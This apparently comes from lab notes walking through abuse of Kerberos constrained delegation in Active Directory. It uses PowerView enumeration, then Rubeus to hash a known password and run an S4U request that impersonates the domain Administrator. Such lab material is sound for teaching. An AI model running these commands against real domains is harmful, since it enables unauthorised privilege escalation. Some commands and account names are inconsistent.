# Kerberos Constrained Delegation

Kerberos Delegation enables an application to access resources hosted on a different server; for example, 
instead of giving the service account running the web server access to the database directly.

# We can configure three types of delegations in Active Directory:

Unconstrained Delegation (most permissive/broad) </br>
Constrained Delegation </br>
Resource-based Delegation </br>

# Constrained Delegation (Walkthrough)

## 1. First, import the module and run the Get-NetUser function.

```
import-module .\Powerview-main.ps1
GetNetuser -TrustedToAuth
```
<img width="1296" height="608" alt="image" src="https://github.com/user-attachments/assets/d2ff11dc-f302-40d6-baec-badaa00f4294" />

We can see that the user web_service is set up to delegate the HTTP service to the Domain Controller DC1.


## 2. Since we know the web_service user’s password is Slavi123, let’s use Rubeus to convert the plaintext password to an NTLM hash (RC4-HMAC key in Kerberos).

```
.\Rubeus.exe hash /password:Slavi123

[*] Input password             : Slavi123
[*]       rc4_hmac             : FCDC65703DD2B0BD789977F1F3EEAECF (NTLM hash)
```

## We will use Rubeus to get a ticket for the Administrator account:

```
.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /pt

.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt
```
<img width="1312" height="341" alt="image" src="https://github.com/user-attachments/assets/fe9c9deb-e71e-408c-9ce0-04139677b47e" />

